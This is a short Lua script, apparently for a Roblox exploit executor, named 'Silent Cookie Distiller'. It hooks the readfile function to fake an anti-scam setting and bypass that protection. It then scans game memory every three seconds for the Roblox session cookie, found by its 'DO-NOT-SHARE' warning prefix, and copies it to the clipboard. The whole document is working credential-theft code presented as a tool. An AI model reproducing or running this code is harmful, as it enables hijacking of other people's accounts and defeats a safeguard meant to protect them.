-- [[ Project: Silent Cookie Distiller - Ghost Scan ]]
print("[DEBUG] Ghost Mode Activated")

local function log(msg) print("[SYSTEM] " .. tostring(msg)) end

-- STEP 1: セキュリティ偽装 (hook)
pcall(function()
    local old_read
    old_read = hookfunction(readfile, function(path)
        if string.find(path:lower(), "disableantiscam") then
            return '{"WARNING":"BYPASS","allowed_games":"*","user_id":"'..tostring(game.Players.LocalPlayer.UserId)..'","version_num":707}'
        end
        return old_read(path)
    end)
    log("Security hook ready.")
end)

-- STEP 2: 超軽量・広域スキャナー
local function ghost_scan()
    local target = "_|WARNING:-DO-NOT-SHARE-"
    -- getgc() の中で「文字列」かつ「警告文」を含むものを一本釣る
    for _, v in pairs(getgc()) do
        if type(v) == "string" and #v > 100 then -- クッキーは長いので短い文字列は無視
            if string.find(v, target, 1, true) then
                local _, pos = string.find(v, "|_", 1, true)
                if pos then
                    setclipboard(string.sub(v, pos + 1))
                    log("!!! GHOST CAPTURE SUCCESS !!!")
                    return true
                end
            end
        end
    end
    return false
end

-- STEP 3: ループ実行 (3秒おきに静かにスキャン)
task.spawn(function()
    log("Ghost scanning... Just wait a moment.")
    while true do
        if ghost_scan() then break end
        task.wait(3) 
    end
end)
